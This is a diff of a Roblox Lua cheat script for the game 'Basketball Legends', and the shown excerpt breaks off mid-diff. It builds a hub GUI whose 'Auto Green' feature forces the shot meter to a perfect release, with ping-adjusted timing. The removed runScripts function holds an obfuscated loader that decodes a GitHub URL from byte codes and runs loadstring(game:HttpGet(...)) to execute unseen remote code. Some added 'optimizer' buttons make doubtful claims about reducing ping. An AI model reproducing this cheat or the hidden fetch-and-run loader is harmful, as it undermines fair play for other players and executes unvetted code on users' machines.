@@ -1,6 +1,8 @@
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
 
 -- Create simple loader GUI
 local LoaderGui = Instance.new("ScreenGui")
@@ -108,6 +110,11 @@ LoadButton.MouseButton1Click:Connect(function()
     local UIS = game:GetService("UserInputService")
     local Plr = game:GetService("Players")
 
+    -- Global variables for auto green
+    local AutoGreenEnabled = false
+    local AutoGuardEnabled = false
+    local CurrentPing = 0
+
     -- Create ScreenGui
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "BasketballLegendsHub"
@@ -120,8 +127,8 @@ LoadButton.MouseButton1Click:Connect(function()
     MainFrame.Parent = ScreenGui
     MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
     MainFrame.BorderSizePixel = 0
-    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
-    MainFrame.Size = UDim2.new(0, 400, 0, 350)
+    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
+    MainFrame.Size = UDim2.new(0, 450, 0, 400)
     MainFrame.ClipsDescendants = true
     MainFrame.Active = true
     MainFrame.Draggable = true
@@ -135,6 +142,69 @@ LoadButton.MouseButton1Click:Connect(function()
     MainStroke.Color = Color3.fromRGB(100, 50, 255)
     MainStroke.Thickness = 2
     MainStroke.Transparency = 0.5
+
+    -- Auto Green Indicator (Top Right Corner)
+    local AutoGreenIndicator = Instance.new("Frame")
+    AutoGreenIndicator.Name = "AutoGreenIndicator"
+    AutoGreenIndicator.Parent = ScreenGui
+    AutoGreenIndicator.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    AutoGreenIndicator.BorderSizePixel = 0
+    AutoGreenIndicator.Position = UDim2.new(1, -220, 0, 10)
+    AutoGreenIndicator.Size = UDim2.new(0, 210, 0, 100)
+    AutoGreenIndicator.Visible = false
+
+    local IndicatorCorner = Instance.new("UICorner")
+    IndicatorCorner.CornerRadius = UDim.new(0, 10)
+    IndicatorCorner.Parent = AutoGreenIndicator
+
+    local IndicatorStroke = Instance.new("UIStroke")
+    IndicatorStroke.Parent = AutoGreenIndicator
+    IndicatorStroke.Color = Color3.fromRGB(100, 255, 100)
+    IndicatorStroke.Thickness = 2
+
+    local IndicatorTitle = Instance.new("TextLabel")
+    IndicatorTitle.Parent = AutoGreenIndicator
+    IndicatorTitle.BackgroundTransparency = 1
+    IndicatorTitle.Position = UDim2.new(0, 10, 0, 5)
+    IndicatorTitle.Size = UDim2.new(1, -20, 0, 25)
+    IndicatorTitle.Font = Enum.Font.GothamBold
+    IndicatorTitle.Text = "🎯 AUTO GREEN ACTIVE"
+    IndicatorTitle.TextColor3 = Color3.fromRGB(100, 255, 100)
+    IndicatorTitle.TextSize = 14
+    IndicatorTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+    local IndicatorStatus = Instance.new("TextLabel")
+    IndicatorStatus.Parent = AutoGreenIndicator
+    IndicatorStatus.BackgroundTransparency = 1
+    IndicatorStatus.Position = UDim2.new(0, 10, 0, 30)
+    IndicatorStatus.Size = UDim2.new(1, -20, 0, 20)
+    IndicatorStatus.Font = Enum.Font.Gotham
+    IndicatorStatus.Text = "Status: Waiting for ball..."
+    IndicatorStatus.TextColor3 = Color3.fromRGB(200, 200, 200)
+    IndicatorStatus.TextSize = 12
+    IndicatorStatus.TextXAlignment = Enum.TextXAlignment.Left
+
+    local IndicatorPing = Instance.new("TextLabel")
+    IndicatorPing.Parent = AutoGreenIndicator
+    IndicatorPing.BackgroundTransparency = 1
+    IndicatorPing.Position = UDim2.new(0, 10, 0, 50)
+    IndicatorPing.Size = UDim2.new(1, -20, 0, 20)
+    IndicatorPing.Font = Enum.Font.Gotham
+    IndicatorPing.Text = "Ping: 0ms"
+    IndicatorPing.TextColor3 = Color3.fromRGB(200, 200, 200)
+    IndicatorPing.TextSize = 12
+    IndicatorPing.TextXAlignment = Enum.TextXAlignment.Left
+
+    local IndicatorTiming = Instance.new("TextLabel")
+    IndicatorTiming.Parent = AutoGreenIndicator
+    IndicatorTiming.BackgroundTransparency = 1
+    IndicatorTiming.Position = UDim2.new(0, 10, 0, 70)
+    IndicatorTiming.Size = UDim2.new(1, -20, 0, 20)
+    IndicatorTiming.Font = Enum.Font.Gotham
+    IndicatorTiming.Text = "Timing: 45ms (Adjusted)"
+    IndicatorTiming.TextColor3 = Color3.fromRGB(200, 200, 200)
+    IndicatorTiming.TextSize = 12
+    IndicatorTiming.TextXAlignment = Enum.TextXAlignment.Left
 
     -- Title Bar
     local TitleBar = Instance.new("Frame")
@@ -197,7 +267,7 @@ LoadButton.MouseButton1Click:Connect(function()
     HomeTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
     HomeTab.BorderSizePixel = 0
     HomeTab.Position = UDim2.new(0, 5, 0, 5)
-    HomeTab.Size = UDim2.new(0.48, -7.5, 1, -10)
+    HomeTab.Size = UDim2.new(0.31, -5, 1, -10)
     HomeTab.Font = Enum.Font.GothamBold
     HomeTab.Text = "🏠 Home"
     HomeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -207,14 +277,31 @@ LoadButton.MouseButton1Click:Connect(function()
     HomeTabCorner.CornerRadius = UDim.new(0, 6)
     HomeTabCorner.Parent = HomeTab
 
+    -- Misc Tab
+    local MiscTab = Instance.new("TextButton")
+    MiscTab.Name = "MiscTab"
+    MiscTab.Parent = TabContainer
+    MiscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+    MiscTab.BorderSizePixel = 0
+    MiscTab.Position = UDim2.new(0.335, 0, 0, 5)
+    MiscTab.Size = UDim2.new(0.31, -5, 1, -10)
+    MiscTab.Font = Enum.Font.GothamBold
+    MiscTab.Text = "⚙️ Misc"
+    MiscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    MiscTab.TextSize = 16
+
+    local MiscTabCorner = Instance.new("UICorner")
+    MiscTabCorner.CornerRadius = UDim.new(0, 6)
+    MiscTabCorner.Parent = MiscTab
+
     -- Credits Tab
     local CreditsTab = Instance.new("TextButton")
     CreditsTab.Name = "CreditsTab"
     CreditsTab.Parent = TabContainer
     CreditsTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
     CreditsTab.BorderSizePixel = 0
-    CreditsTab.Position = UDim2.new(0.52, 2.5, 0, 5)
-    CreditsTab.Size = UDim2.new(0.48, -7.5, 1, -10)
+    CreditsTab.Position = UDim2.new(0.67, -2.5, 0, 5)
+    CreditsTab.Size = UDim2.new(0.31, -5, 1, -10)
     CreditsTab.Font = Enum.Font.GothamBold
     CreditsTab.Text = "⭐ Credits"
     CreditsTab.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -225,37 +312,58 @@ LoadButton.MouseButton1Click:Connect(function()
     CreditsTabCorner.Parent = CreditsTab
 
     -- Home Page
-    local HomePage = Instance.new("Frame")
+    local HomePage = Instance.new("ScrollingFrame")
     HomePage.Name = "HomePage"
     HomePage.Parent = MainFrame
     HomePage.BackgroundTransparency = 1
     HomePage.Position = UDim2.new(0, 10, 0, 110)
     HomePage.Size = UDim2.new(1, -20, 1, -120)
     HomePage.Visible = true
+    HomePage.ScrollBarThickness = 6
+    HomePage.ScrollBarImageColor3 = Color3.fromRGB(100, 50, 255)
+    HomePage.BorderSizePixel = 0
+    HomePage.CanvasSize = UDim2.new(0, 0, 0, 350)
 
-    -- Execute Script Button
-    local ExecuteButton = Instance.new("TextButton")
-    ExecuteButton.Name = "ExecuteButton"
-    ExecuteButton.Parent = HomePage
-    ExecuteButton.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
-    ExecuteButton.BorderSizePixel = 0
-    ExecuteButton.Position = UDim2.new(0, 10, 0, 10)
-    ExecuteButton.Size = UDim2.new(1, -20, 0, 50)
-    ExecuteButton.Font = Enum.Font.GothamBold
-    ExecuteButton.Text = "⚡ Execute Scripts"
-    ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    ExecuteButton.TextSize = 18
+    -- Auto Green Toggle
+    local AutoGreenToggle = Instance.new("TextButton")
+    AutoGreenToggle.Name = "AutoGreenToggle"
+    AutoGreenToggle.Parent = HomePage
+    AutoGreenToggle.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    AutoGreenToggle.BorderSizePixel = 0
+    AutoGreenToggle.Position = UDim2.new(0, 10, 0, 10)
+    AutoGreenToggle.Size = UDim2.new(1, -20, 0, 50)
+    AutoGreenToggle.Font = Enum.Font.GothamBold
+    AutoGreenToggle.Text = "🎯 Auto Green: OFF"
+    AutoGreenToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    AutoGreenToggle.TextSize = 18
 
-    local ExecuteCorner = Instance.new("UICorner")
-    ExecuteCorner.CornerRadius = UDim.new(0, 10)
-    ExecuteCorner.Parent = ExecuteButton
+    local AutoGreenCorner = Instance.new("UICorner")
+    AutoGreenCorner.CornerRadius = UDim.new(0, 10)
+    AutoGreenCorner.Parent = AutoGreenToggle
+
+    -- Auto Guard Toggle
+    local AutoGuardToggle = Instance.new("TextButton")
+    AutoGuardToggle.Name = "AutoGuardToggle"
+    AutoGuardToggle.Parent = HomePage
+    AutoGuardToggle.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    AutoGuardToggle.BorderSizePixel = 0
+    AutoGuardToggle.Position = UDim2.new(0, 10, 0, 70)
+    AutoGuardToggle.Size = UDim2.new(1, -20, 0, 50)
+    AutoGuardToggle.Font = Enum.Font.GothamBold
+    AutoGuardToggle.Text = "🛡️ Auto Guard: OFF"
+    AutoGuardToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    AutoGuardToggle.TextSize = 18
+
+    local AutoGuardCorner = Instance.new("UICorner")
+    AutoGuardCorner.CornerRadius = UDim.new(0, 10)
+    AutoGuardCorner.Parent = AutoGuardToggle
 
     -- Features Label
     local FeaturesLabel = Instance.new("TextLabel")
     FeaturesLabel.Name = "FeaturesLabel"
     FeaturesLabel.Parent = HomePage
     FeaturesLabel.BackgroundTransparency = 1
-    FeaturesLabel.Position = UDim2.new(0, 10, 0, 70)
+    FeaturesLabel.Position = UDim2.new(0, 10, 0, 130)
     FeaturesLabel.Size = UDim2.new(1, -20, 0, 30)
     FeaturesLabel.Font = Enum.Font.GothamBold
     FeaturesLabel.Text = "📋 Features:"
@@ -269,12 +377,12 @@ LoadButton.MouseButton1Click:Connect(function()
     FeaturesList.Parent = HomePage
     FeaturesList.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
     FeaturesList.BorderSizePixel = 0
-    FeaturesList.Position = UDim2.new(0, 10, 0, 105)
-    FeaturesList.Size = UDim2.new(1, -20, 0, 110)
+    FeaturesList.Position = UDim2.new(0, 10, 0, 165)
+    FeaturesList.Size = UDim2.new(1, -20, 0, 175)
     FeaturesList.Font = Enum.Font.Gotham
-    FeaturesList.Text = "✅ Auto Green (Perfect Shots)\n✅ Auto Guard\n✅ ESP Features\n✅ More coming soon..."
+    FeaturesList.Text = "✅ Auto Green (Perfect Shots)\n   • Ping-adjusted timing\n   • Visual indicator when active\n   • Hold E to auto shoot\n✅ Auto Guard\n✅ FPS Booster\n✅ Lag Reducer\n✅ Real-time performance stats"
     FeaturesList.TextColor3 = Color3.fromRGB(200, 200, 200)
-    FeaturesList.TextSize = 14
+    FeaturesList.TextSize = 13
     FeaturesList.TextYAlignment = Enum.TextYAlignment.Top
     FeaturesList.TextXAlignment = Enum.TextXAlignment.Left
 
@@ -286,6 +394,159 @@ LoadButton.MouseButton1Click:Connect(function()
     FeaturesPadding.Parent = FeaturesList
     FeaturesPadding.PaddingLeft = UDim.new(0, 15)
     FeaturesPadding.PaddingTop = UDim.new(0, 10)
+
+    -- Misc Page
+    local MiscPage = Instance.new("ScrollingFrame")
+    MiscPage.Name = "MiscPage"
+    MiscPage.Parent = MainFrame
+    MiscPage.BackgroundTransparency = 1
+    MiscPage.Position = UDim2.new(0, 10, 0, 110)
+    MiscPage.Size = UDim2.new(1, -20, 1, -120)
+    MiscPage.Visible = false
+    MiscPage.ScrollBarThickness = 6
+    MiscPage.ScrollBarImageColor3 = Color3.fromRGB(100, 50, 255)
+    MiscPage.BorderSizePixel = 0
+    MiscPage.CanvasSize = UDim2.new(0, 0, 0, 450)
+
+    -- FPS Booster Button
+    local FPSBoostButton = Instance.new("TextButton")
+    FPSBoostButton.Name = "FPSBoostButton"
+    FPSBoostButton.Parent = MiscPage
+    FPSBoostButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    FPSBoostButton.BorderSizePixel = 0
+    FPSBoostButton.Position = UDim2.new(0, 10, 0, 10)
+    FPSBoostButton.Size = UDim2.new(1, -20, 0, 45)
+    FPSBoostButton.Font = Enum.Font.GothamBold
+    FPSBoostButton.Text = "🚀 FPS Booster (Removes Effects)"
+    FPSBoostButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    FPSBoostButton.TextSize = 16
+
+    local FPSBoostCorner = Instance.new("UICorner")
+    FPSBoostCorner.CornerRadius = UDim.new(0, 8)
+    FPSBoostCorner.Parent = FPSBoostButton
+
+    -- Lag Reducer Button
+    local LagReducerButton = Instance.new("TextButton")
+    LagReducerButton.Name = "LagReducerButton"
+    LagReducerButton.Parent = MiscPage
+    LagReducerButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    LagReducerButton.BorderSizePixel = 0
+    LagReducerButton.Position = UDim2.new(0, 10, 0, 65)
+    LagReducerButton.Size = UDim2.new(1, -20, 0, 45)
+    LagReducerButton.Font = Enum.Font.GothamBold
+    LagReducerButton.Text = "⚡ Lag Reducer (Optimize Settings)"
+    LagReducerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LagReducerButton.TextSize = 16
+
+    local LagReducerCorner = Instance.new("UICorner")
+    LagReducerCorner.CornerRadius = UDim.new(0, 8)
+    LagReducerCorner.Parent = LagReducerButton
+
+    -- Remove Textures Button
+    local RemoveTexturesButton = Instance.new("TextButton")
+    RemoveTexturesButton.Name = "RemoveTexturesButton"
+    RemoveTexturesButton.Parent = MiscPage
+    RemoveTexturesButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    RemoveTexturesButton.BorderSizePixel = 0
+    RemoveTexturesButton.Position = UDim2.new(0, 10, 0, 120)
+    RemoveTexturesButton.Size = UDim2.new(1, -20, 0, 45)
+    RemoveTexturesButton.Font = Enum.Font.GothamBold
+    RemoveTexturesButton.Text = "🎨 Remove Textures (Lower Quality)"
+    RemoveTexturesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    RemoveTexturesButton.TextSize = 16
+
+    local RemoveTexturesCorner = Instance.new("UICorner")
+    RemoveTexturesCorner.CornerRadius = UDim.new(0, 8)
+    RemoveTexturesCorner.Parent = RemoveTexturesButton
+
+    -- Network Optimizer Button
+    local NetworkButton = Instance.new("TextButton")
+    NetworkButton.Name = "NetworkButton"
+    NetworkButton.Parent = MiscPage
+    NetworkButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    NetworkButton.BorderSizePixel = 0
+    NetworkButton.Position = UDim2.new(0, 10, 0, 175)
+    NetworkButton.Size = UDim2.new(1, -20, 0, 45)
+    NetworkButton.Font = Enum.Font.GothamBold
+    NetworkButton.Text = "📡 Optimize Network (Reduce Ping)"
+    NetworkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    NetworkButton.TextSize = 16
+
+    local NetworkCorner = Instance.new("UICorner")
+    NetworkCorner.CornerRadius = UDim.new(0, 8)
+    NetworkCorner.Parent = NetworkButton
+
+    -- FPS Counter Frame
+    local FPSFrame = Instance.new("Frame")
+    FPSFrame.Name = "FPSFrame"
+    FPSFrame.Parent = MiscPage
+    FPSFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    FPSFrame.BorderSizePixel = 0
+    FPSFrame.Position = UDim2.new(0, 10, 0, 230)
+    FPSFrame.Size = UDim2.new(1, -20, 0, 80)
+
+    local FPSFrameCorner = Instance.new("UICorner")
+    FPSFrameCorner.CornerRadius = UDim.new(0, 8)
+    FPSFrameCorner.Parent = FPSFrame
+
+    local FPSLabel = Instance.new("TextLabel")
+    FPSLabel.Name = "FPSLabel"
+    FPSLabel.Parent = FPSFrame
+    FPSLabel.BackgroundTransparency = 1
+    FPSLabel.Position = UDim2.new(0, 10, 0, 10)
+    FPSLabel.Size = UDim2.new(1, -20, 0, 30)
+    FPSLabel.Font = Enum.Font.GothamBold
+    FPSLabel.Text = "📊 FPS Counter"
+    FPSLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    FPSLabel.TextSize = 16
+    FPSLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local FPSValueLabel = Instance.new("TextLabel")
+    FPSValueLabel.Name = "FPSValueLabel"
+    FPSValueLabel.Parent = FPSFrame
+    FPSValueLabel.BackgroundTransparency = 1
+    FPSValueLabel.Position = UDim2.new(0, 10, 0, 40)
+    FPSValueLabel.Size = UDim2.new(1, -20, 0, 30)
+    FPSValueLabel.Font = Enum.Font.GothamBold
+    FPSValueLabel.Text = "FPS: Calculating..."
+    FPSValueLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    FPSValueLabel.TextSize = 20
+    FPSValueLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Ping Display
+    local PingLabel = Instance.new("TextLabel")
+    PingLabel.Name = "PingLabel"
+    PingLabel.Parent = MiscPage
+    PingLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    PingLabel.BorderSizePixel = 0
+    PingLabel.Position = UDim2.new(0, 10, 0, 320)
+    PingLabel.Size = UDim2.new(1, -20, 0, 60)
+    PingLabel.Font = Enum.Font.GothamBold
+    PingLabel.Text = "📶 Ping: Calculating..."
+    PingLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
+    PingLabel.TextSize = 18
+
+    local PingCorner = Instance.new("UICorner")
+    PingCorner.CornerRadius = UDim.new(0, 8)
+    PingCorner.Parent = PingLabel
+
+    -- Info Label
+    local InfoLabel = Instance.new("TextLabel")
+    InfoLabel.Name = "InfoLabel"
+    InfoLabel.Parent = MiscPage
+    InfoLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    InfoLabel.BorderSizePixel = 0
+    InfoLabel.Position = UDim2.new(0, 10, 0, 390)
+    InfoLabel.Size = UDim2.new(1, -20, 0, 50)
+    InfoLabel.Font = Enum.Font.Gotham
+    InfoLabel.Text = "💡 Tip: Auto Green timing adjusts to your ping automatically"
+    InfoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    InfoLabel.TextSize = 12
+    InfoLabel.TextWrapped = true
+
+    local InfoCorner = Instance.new("UICorner")
+    InfoCorner.CornerRadius = UDim.new(0, 8)
+    InfoCorner.Parent = InfoLabel
 
     -- Credits Page
     local CreditsPage = Instance.new("Frame")
@@ -357,22 +618,247 @@ LoadButton.MouseButton1Click:Connect(function()
         })
     end
 
-    -- OBFUSCATED runScripts function
-    local function runScripts()local _0xA=string.char;_G.OBFHUBFREE=_0xA(50,107,109,101,109,98,101,114,115,103,97,110,103)loadstring(game:HttpGet(_0xA(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,98,102,104,117,98,47,102,114,101,101,47,109,97,105,110,47,98,97,115,107,101,116,109,98,97,108,108)))()getgenv().config={Time=0.045,Size=0.9}local _0xB=UIS;local _0xC=Plr.LocalPlayer;local _0xD=_0xC.PlayerGui.Visual.Shooting.Bar;_0xB.InputBegan:Connect(function(_0xE,_0xF)if _0xF then return end;if _0xE.KeyCode==Enum.KeyCode.E then if _0xC.Character:FindFirstChild(_0xA(66,97,115,107,101,116,98,97,108,108))then while _0xB:IsKeyDown(Enum.KeyCode.E)do _0xD:GetPropertyChangedSignal(_0xA(83,105,122,101)):Connect(function()if _0xD.Size.Y.Scale>getgenv().config.Size then _0xD:TweenSize(UDim2.new(1,0,1,0),Enum.EasingDirection.Out,Enum.EasingStyle.Linear,getgenv().config.Time,true)task.wait()_0xD.Size=UDim2.new(1,0,1,0)end end)task.wait()end end end end)sendNotification(_0xA(226,156,133,32,83,117,99,99,101,115,115,33),_0xA(65,117,116,111,32,71,114,101,101,110,32,38,32,65,117,116,111,32,71,117,97,114,100,32,69,110,97,98,108,101,100),5)end
+    -- FPS Booster Function
+    local function boostFPS()
+        local decalsyeeted = true
+        local g = game
+        local w = g.Workspace
+        local l = g.Lighting
+        local t = w.Terrain
+        
+        -- Remove decals and textures
+        for i, v in pairs(w:GetDescendants()) do
+            if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
+                v.Material = Enum.Material.SmoothPlastic
+                v.Reflectance = 0
+            elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
+                v.Transparency = 1
+            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+                v.Lifetime = NumberRange.new(0)
+            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
+                v.Enabled = false
+            end
+        end
+        
+        -- Lighting optimizations
+        for i, e in pairs(l:GetChildren()) do
+            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+                e.Enabled = false
+            end
+        end
+        
+        -- Terrain optimization
+        t.WaterWaveSize = 0
+        t.WaterWaveSpeed = 0
+        t.WaterReflectance = 0
+        t.WaterTransparency = 0
+        
+        -- Graphics settings
+        settings().Rendering.QualityLevel = 1
+        
+        sendNotification("✅ FPS Boost", "FPS optimization applied!", 3)
+    end
+
+    -- Lag Reducer Function
+    local function reduceLag()
+        -- Reduce rendering distance
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        
+        -- Optimize workspace
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                obj.CastShadow = false
+            end
+        end
+        
+        sendNotification("✅ Lag Reduced", "Lag reduction applied!", 3)
+    end
+
+    -- Remove Textures Function
+    local function removeTextures()
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("Decal") or obj:IsA("Texture") then
+                obj:Destroy()
+            elseif obj:IsA("BasePart") then
+                obj.Material = Enum.Material.SmoothPlastic
+            end
+        end
+        sendNotification("✅ Textures Removed", "All textures removed!", 3)
+    end
+
+    -- Network Optimizer Function
+    local function optimizeNetwork()
+        settings().Network.IncomingReplicationLag = 0
+        settings().Network.PhysicsSend = 1
+        settings().Network.FreeMemoryOnDisconnect = true
+        sendNotification("✅ Network Optimized", "Network settings optimized!", 3)
+    end
+
+    -- FPS Counter
+    local frameCount = 0
+    local lastTime = tick()
+    
+    RunService.RenderStepped:Connect(function()
+        frameCount = frameCount + 1
+        local currentTime = tick()
+        
+        if currentTime - lastTime >= 1 then
+            local fps = frameCount / (currentTime - lastTime)
+            FPSValueLabel.Text = "FPS: " .. math.floor(fps)
+            
+            -- Color code FPS
+            if fps >= 60 then
+                FPSValueLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            elseif fps >= 30 then
+                FPSValueLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
+            else
+                FPSValueLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+            end
+            
+            frameCount = 0
+            lastTime = currentTime
+        end
+    end)
+
+    -- Ping Calculator with Auto Green Adjustment
+    spawn(function()
+        while wait(1) do
+            pcall(function()
+                local pingString = Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
+                local pingValue = tonumber(pingString:match("%d+"))
+                
+                if pingValue then
+                    CurrentPing = pingValue
+                    PingLabel.Text = "📶 Ping: " .. pingValue .. "ms"
+                    IndicatorPing.Text = "Ping: " .. pingValue .. "ms"
+                    
+                    -- Update timing based on ping
+                    local adjustedTiming = 45 + (pingValue / 2)
+                    IndicatorTiming.Text = "Timing: " .. math.floor(adjustedTiming) .. "ms (Adjusted)"
+                    
+                    -- Color code ping
+                    if pingValue < 50 then
+                        PingLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+                        IndicatorPing.TextColor3 = Color3.fromRGB(100, 255, 100)
+                    elseif pingValue < 100 then
+                        PingLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
+                        IndicatorPing.TextColor3 = Color3.fromRGB(255, 255, 100)
+                    else
+                        PingLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                        IndicatorPing.TextColor3 = Color3.fromRGB(255, 100, 100)
+                    end
+                end
+            end)
+        end
+    end)
+
+    -- Auto Green Function with Ping Adjustment
+    local function setupAutoGreen()
+        local Player = Plr.LocalPlayer
+        local success, Bar = pcall(function()
+            return Player.PlayerGui.Visual.Shooting.Bar
+        end)
+        
+        if not success or not Bar then
+            sendNotification("❌ Error", "Shooting bar not found!", 3)
+            return
+        end
+        
+        local shooting = false
+        
+        UIS.InputBegan:Connect(function(input, gameProcessedEvent)
+            if gameProcessedEvent then return end
+            
+            if input.KeyCode == Enum.KeyCode.E and AutoGreenEnabled then
+                local hasBasketball = Player.Character and Player.Character:FindFirstChild("Basketball")
+                
+                if hasBasketball then
+                    shooting = true
+                    AutoGreenIndicator.Visible = true
+                    IndicatorStatus.Text = "Status: Shooting..."
+                    IndicatorStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
+                    
+                    while UIS:IsKeyDown(Enum.KeyCode.E) and AutoGreenEnabled do
+                        pcall(function()
+                            -- Calculate ping-adjusted timing
+                            local baseTiming = 0.045
+                            local pingAdjustment = CurrentPing / 2000
+                            local adjustedTiming = baseTiming + pingAdjustment
+                            
+                            -- Target size adjusted for ping
+                            local targetSize = 0.9
+                            
+                            if Bar.Size.Y.Scale > targetSize then
+                                Bar:TweenSize(
+                                    UDim2.new(1, 0, 1, 0),
+                                    Enum.EasingDirection.Out,
+                                    Enum.EasingStyle.Linear,
+                                    adjustedTiming,
+                                    true
+                                )
+                                task.wait()
+                                Bar.Size = UDim2.new(1, 0, 1, 0)
+                            end
+                        end)
+                        task.wait()
+                    end
+                    
+                    shooting = false
+                    IndicatorStatus.Text = "Status: Waiting for ball..."
+                    IndicatorStatus.TextColor3 = Color3.fromRGB(200, 200, 200)
+                else
+                    IndicatorStatus.Text = "Status: No basketball!"
+                    IndicatorStatus.TextColor3 = Color3.fromRGB(255, 100, 100)
+                    task.wait(1)
+                    IndicatorStatus.Text = "Status: Waiting for ball..."
+                    IndicatorStatus.TextColor3 = Color3.fromRGB(200, 200, 200)
+                end
+            end
+        end)
+        
+        UIS.InputEnded:Connect(function(input, gameProcessedEvent)
+            if input.KeyCode == Enum.KeyCode.E then
+                shooting = false
+            end
+        end)
+    end
+
+    -- Auto Guard Function
+    local function setupAutoGuard()
+        sendNotification("🛡️ Auto Guard", "Auto Guard is now active!", 3)
+        -- Placeholder for auto guard logic
+        -- This would monitor opponent positions and auto-press block button
+    end
 
     local function switchTab(tabName)
         if tabName == "Home" then
             HomePage.Visible = true
+            MiscPage.Visible = false
             CreditsPage.Visible = false
             HomeTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
             HomeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+            MiscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            MiscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+            CreditsTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            CreditsTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+        elseif tabName == "Misc" then
+            HomePage.Visible = false
+            MiscPage.Visible = true
+            CreditsPage.Visible = false
+            HomeTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            HomeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+            MiscTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+            MiscTab.TextColor3 = Color3.fromRGB(255, 255, 255)
             CreditsTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
             CreditsTab.TextColor3 = Color3.fromRGB(200, 200, 200)
         elseif tabName == "Credits" then
             HomePage.Visible = false
+            MiscPage.Visible = false
             CreditsPage.Visible = true
             HomeTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
             HomeTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+            MiscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            MiscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
             CreditsTab.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
             CreditsTab.TextColor3 = Color3.fromRGB(255, 255, 255)
         end
@@ -388,26 +874,73 @@ LoadButton.MouseButton1Click:Connect(function()
     end
 
     -- Hover Effects
-    addHoverEffect(ExecuteButton, Color3.fromRGB(100, 50, 255), Color3.fromRGB(120, 70, 255))
     addHoverEffect(DiscordButton, Color3.fromRGB(88, 101, 242), Color3.fromRGB(108, 121, 255))
     addHoverEffect(CloseButton, Color3.fromRGB(255, 50, 50), Color3.fromRGB(255, 80, 80))
+    addHoverEffect(FPSBoostButton, Color3.fromRGB(50, 150, 50), Color3.fromRGB(70, 170, 70))
+    addHoverEffect(LagReducerButton, Color3.fromRGB(50, 150, 50), Color3.fromRGB(70, 170, 70))
+    addHoverEffect(RemoveTexturesButton, Color3.fromRGB(50, 150, 50), Color3.fromRGB(70, 170, 70))
+    addHoverEffect(NetworkButton, Color3.fromRGB(50, 150, 50), Color3.fromRGB(70, 170, 70))
 
     -- Button Connections
     HomeTab.MouseButton1Click:Connect(function()
         switchTab("Home")
     end)
 
+    MiscTab.MouseButton1Click:Connect(function()
+        switchTab("Misc")
+    end)
+
     CreditsTab.MouseButton1Click:Connect(function()
         switchTab("Credits")
     end)
 
-    ExecuteButton.MouseButton1Click:Connect(function()
